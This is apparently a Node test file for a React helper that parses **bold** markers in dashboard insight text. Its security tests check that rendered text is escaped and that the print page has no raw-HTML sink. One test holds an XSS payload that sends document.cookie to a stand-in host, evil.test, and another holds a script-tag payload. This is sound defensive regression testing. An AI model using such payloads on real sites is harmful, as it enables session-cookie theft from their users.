import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { boldSegments } from '../lib/richText.js';

const join = (segments) => segments.map((s) => s.text).join('');

test('plain text is one unbolded segment', () => {
  assert.deepEqual(boldSegments('Electronics leads on revenue.'), [
    { text: 'Electronics leads on revenue.', bold: false },
  ]);
});

test('a bold run is split out with the text either side of it', () => {
  assert.deepEqual(boldSegments('Revenue rose **42%** last quarter.'), [
    { text: 'Revenue rose ', bold: false },
    { text: '42%', bold: true },
    { text: ' last quarter.', bold: false },
  ]);
});

test('several bold runs all survive, in order', () => {
  const segments = boldSegments('**North** beat **South** on margin');
  assert.deepEqual(
    segments.map((s) => [s.text, s.bold]),
    [
      ['North', true],
      [' beat ', false],
      ['South', true],
      [' on margin', false],
    ]
  );
});

test('unmatched and empty markers stay literal', () => {
  assert.deepEqual(boldSegments('a ** b'), [{ text: 'a ** b', bold: false }]);
  assert.deepEqual(boldSegments('****'), [{ text: '****', bold: false }]);
});

test('nothing is dropped or invented — segments partition the input', () => {
  // Only the markers that actually paired are consumed; an unmatched one is
  // part of the text and stays in it.
  const cases = [
    ['Electronics carries 51.3% of the ten categories shown.', 'Electronics carries 51.3% of the ten categories shown.'],
    ['**Focus:** margin, not volume', 'Focus: margin, not volume'],
    ['a ** b', 'a ** b'],
    ['', ''],
    ['trailing **bold**', 'trailing bold'],
    ['**leading** text', 'leading text'],
  ];
  for (const [input, expected] of cases) {
    assert.equal(join(boldSegments(input)), expected, `reconstructing ${JSON.stringify(input)}`);
  }
});

test('empty and nullish input produce nothing to render', () => {
  assert.deepEqual(boldSegments(''), []);
  assert.deepEqual(boldSegments(null), []);
  assert.deepEqual(boldSegments(undefined), []);
});

// ---------------------------------------------------------------------------
// The reason this module exists.
// ---------------------------------------------------------------------------

/**
 * Exactly the mapping the print page performs, rendered for real.
 *
 * Asserting that `boldSegments` "returns the text unchanged" would prove
 * nothing about safety — the whole question is what happens when those segments
 * are put on a page. So they are actually rendered here, and the markup is
 * checked.
 */
const renderCard = (content) =>
  renderToStaticMarkup(
    React.createElement(
      'span',
      null,
      boldSegments(content).map((segment, j) =>
        segment.bold
          ? React.createElement('strong', { key: j, className: 'text-white font-black' }, segment.text)
          : segment.text
      )
    )
  );

test('markup in a summary takeaway is rendered as text, not as markup', () => {
  // The attack the old code allowed: this text is editable on the dashboard and
  // travels inside a shared analysis, and the PDF renderer runs the print page
  // carrying the *reader's* session cookies.
  const hostile = 'Revenue fell <img src=x onerror="fetch(`//evil.test?c=${document.cookie}`)"> sharply';
  const html = renderCard(hostile);

  assert.ok(!html.includes('<img'), 'no element is created');
  assert.ok(html.includes('&lt;img'), 'it is escaped and shown as text');
  assert.ok(html.includes('&quot;'), 'the attribute quotes are escaped too');

  // `onerror=` does still appear in the output, as text, and that is correct:
  // React escapes `<`, `>` and quotes, which is what makes the whole run inert.
  // It has no reason to escape `=`. What matters is that no element exists for
  // a handler to attach to — asserted above, and again here.
  assert.ok(!/<(?!\/?(?:span|strong)\b)/.test(html), 'the only tags are the ones this page emits');
});

test('a script tag cannot be smuggled inside the bold markers either', () => {
  const html = renderCard('Margin **<script>alert(1)</script>** improved');
  assert.ok(!html.includes('<script'), 'no script element is created');
  assert.ok(html.includes('&lt;script'), 'it is escaped inside the strong tag');
  assert.ok(html.includes('<strong'), 'and the bold run still renders as bold');
});

test('ordinary text still renders with its bold run intact', () => {
  assert.equal(
    renderCard('Revenue rose **42%** last quarter.'),
    '<span>Revenue rose <strong class="text-white font-black">42%</strong> last quarter.</span>'
  );
});

test('an insight mentioning a less-than sign is no longer eaten', () => {
  // A side effect of the old raw-HTML path: "<5% of orders" lost everything
  // from the "<" onward, because the browser read it as an unclosed tag.
  const html = renderCard('Under **<5%** of orders were returned');
  assert.ok(html.includes('&lt;5%'), 'the comparison survives as text');
});

test('the print page holds no raw-HTML sink', () => {
  // A source check, because the page itself cannot be imported here — it pulls
  // in recharts and next internals. This is the line the fix removed, and it is
  // the only thing standing between a shared analysis and the reader's session.
  // The attribute form, not the bare word: the fix left a comment naming what
  // it removed, and that comment is worth keeping.
  const source = readFileSync(new URL('../app/report/print/page.js', import.meta.url), 'utf8');
  assert.ok(
    !/dangerouslySetInnerHTML\s*=/.test(source),
    'app/report/print/page.js must not render analysis text as HTML'
  );
});
